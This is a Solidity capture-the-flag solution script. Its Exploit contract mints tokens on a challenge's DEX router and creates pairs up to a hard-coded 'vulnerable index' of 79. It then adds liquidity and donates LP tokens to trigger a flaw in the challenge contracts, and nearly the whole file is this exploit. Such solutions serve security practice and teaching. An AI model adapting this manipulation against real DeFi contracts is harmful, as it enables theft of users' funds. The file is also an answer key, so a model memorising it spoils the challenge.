pragma solidity ^0.8.17;

import "forge-ctf/CTFSolver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "src/Challenge.sol";
import "src/Router.sol";
import "src/PairFactory.sol";

uint256 constant TOKENS = 20;
uint256 constant VULNERABLE_INDEX = 79;

contract Exploit {
    Challenge private immutable CHALLENGE;

    Router private immutable ROUTER;
    PairFactory private immutable PAIR_FACTORY;

    address[] private tokens;

    uint256 private counter;
    uint256 private createdPairs;

    constructor(Challenge challenge) {
        CHALLENGE = challenge;

        ROUTER = Router(CHALLENGE.ROUTER());
        PAIR_FACTORY = PairFactory(ROUTER.pairFactory());
    }

    function createTokens() external {
        address[] memory tokens_ = new address[](TOKENS);

        // Create token a, b
        for (uint256 i = 0; i < TOKENS; i++) {
            string memory tokenName = "";
            uint256 toMint = 0;
            uint256 tokenPrice = 1;

            if (i == 0) {
                (toMint, tokenPrice) = (2000, 50 ether / 2000);
            } else if (i == 1 || i == 2) {
                (toMint, tokenPrice) = (20 ether, 1);
            } else {
                (toMint, tokenPrice) = (2000, 2000);
            }

            tokens_[i] = createToken(tokenName, toMint, tokenPrice);
        }

        tokens = tokens_;
    }

    function createPairs(uint256 cap) external {
        uint256 startAmount = createdPairs;

        for (; (createdPairs - startAmount) < cap && createdPairs < VULNERABLE_INDEX; counter++) {
            uint256 a = counter / (TOKENS - 2) + 2;
            uint256 b = counter % (TOKENS - 2) + 2;
            if (a >= b) {
                continue;
            }

            ROUTER.createPair(tokens[a], tokens[b]);
            createdPairs++;
        }
    }

    function exploit() external {
        address[] memory tokens_ = tokens;

        address p1 = ROUTER.createPair(tokens_[1], tokens_[2]);
        address p0 = ROUTER.createPair(tokens_[0], tokens_[3]);

        addLiquidity(tokens_[0], tokens_[3], 2000, 2000);
        addLiquidity(tokens_[1], tokens_[2], 20 ether, 20 ether);

        IERC20(p1).approve(address(ROUTER), type(uint256).max);
        ROUTER.donate(p1, IERC20(p1).balanceOf(address(this)));
    }

    function createToken(string memory name, uint256 mint, uint256 price) internal returns (address t) {
        t = ROUTER.createToken(name, name);
        ROUTER.listing(t, price);
        if (mint != 0) {
            ROUTER.mint(t, mint);
        }
        IERC20(t).approve(address(PAIR_FACTORY), type(uint256).max);
    }

    function addLiquidity(address token0, address token1, uint256 mint0, uint256 mint1) internal {
        PAIR_FACTORY.addLiquidity(token0, token1, mint0, mint1, 0, 0, address(this), type(uint256).max);
    }
}

contract Solve is CTFSolver {
    function solve(address challenge, address) internal override {
        Exploit exploit = new Exploit(Challenge(challenge));

        exploit.createTokens();
        for (uint256 i = 0; i < VULNERABLE_INDEX / 10 + 1; i++) {
            exploit.createPairs(10);
        }
        exploit.exploit();
    }
}
